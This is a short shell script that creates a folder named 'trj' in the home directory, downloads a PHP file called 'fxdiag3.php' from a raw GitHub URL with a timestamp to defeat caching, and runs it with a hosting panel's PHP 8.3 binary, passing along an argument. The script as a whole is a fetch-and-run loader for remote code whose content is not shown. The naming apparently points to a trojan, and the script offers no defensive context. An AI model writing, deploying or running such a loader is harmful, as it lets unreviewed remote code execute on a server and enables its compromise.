#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxdiag3.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxdiag3.php?t=$(date +%s)" && mv fxdiag3.php.new fxdiag3.php
/opt/alt/php83/usr/bin/php fxdiag3.php "$1"
